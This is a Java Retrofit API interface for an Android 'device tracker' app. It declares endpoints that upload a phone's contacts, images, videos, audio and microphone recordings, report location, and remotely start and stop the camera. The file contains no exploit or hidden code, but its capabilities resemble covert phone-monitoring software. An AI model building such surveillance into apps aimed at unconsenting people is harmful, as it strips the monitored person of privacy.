package com.example.devicetrackerapp.api;

import com.example.devicetrackerapp.dto.ApiResponse;
import com.example.devicetrackerapp.dto.ContactPayload;
import com.example.devicetrackerapp.dto.ImageFolderSyncRequest;
import com.example.devicetrackerapp.dto.RegisterDeviceRequest;
import com.example.devicetrackerapp.dto.RegisterDeviceResponse;
import com.example.devicetrackerapp.dto.TrackingConfigResponse;
import com.example.devicetrackerapp.dto.UpdateLocationRequest;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.Path;

import java.util.List;

public interface ApiService {

    // ================= Device =================

    @POST("api/device/register")
    Call<ApiResponse<RegisterDeviceResponse>> registerDevice(
            @Body RegisterDeviceRequest request
    );

    @POST("api/device/update")
    Call<ApiResponse<String>> updateDevice(
            @Body UpdateLocationRequest request
    );

    @GET("api/device/tracking/config/{deviceId}")
    Call<ApiResponse<TrackingConfigResponse>> getTrackingConfig(
            @Path("deviceId") String deviceId
    );

    // ================= Contacts =================

    @POST("media/contact/save")
    Call<ApiResponse<String>> saveContacts(
            @Body ContactPayload payload
    );

    // ================= Images =================

    @Multipart
    @POST("/media/image/upload")
    Call<ApiResponse<String>> uploadImages(

            @Part("deviceId") RequestBody deviceId,

            @Part("bucketId") RequestBody bucketId,

            @Part List<MultipartBody.Part> files

    );

    @POST("media/image/folders")
    Call<ApiResponse<String>> syncImageFolders(

            @Body ImageFolderSyncRequest request

    );

    // ================= Videos =================

    @Multipart
    @POST("media/video/upload")
    Call<ApiResponse<String>> uploadVideos(

            @Part("deviceId") RequestBody deviceId,

            @Part List<MultipartBody.Part> files

    );

    // ================= Audios =================

    @Multipart
    @POST("media/audio/upload")
    Call<ApiResponse<String>> uploadAudios(

            @Part("deviceId") RequestBody deviceId,

            @Part List<MultipartBody.Part> files

    );

    // ================= Mic =================

    @Multipart
    @POST("media/mic/upload")
    Call<ApiResponse<String>> uploadMicRecording(

            @Part("deviceId") RequestBody deviceId,

            @Part("duration") RequestBody duration,

            @Part MultipartBody.Part file

    );

    // ================= Camera =================

    @POST("media/camera/request/{deviceId}")
    Call<ApiResponse<String>> requestCamera(
            @Path("deviceId") String deviceId
    );

    @POST("media/camera/request-received/{deviceId}")
    Call<ApiResponse<String>> cameraRequestReceived(
            @Path("deviceId") String deviceId
    );

    @POST("media/camera/started/{deviceId}")
    Call<ApiResponse<String>> cameraStarted(
            @Path("deviceId") String deviceId
    );

    @POST("media/camera/stopped/{deviceId}")
    Call<ApiResponse<String>> cameraStopped(
            @Path("deviceId") String deviceId
    );
}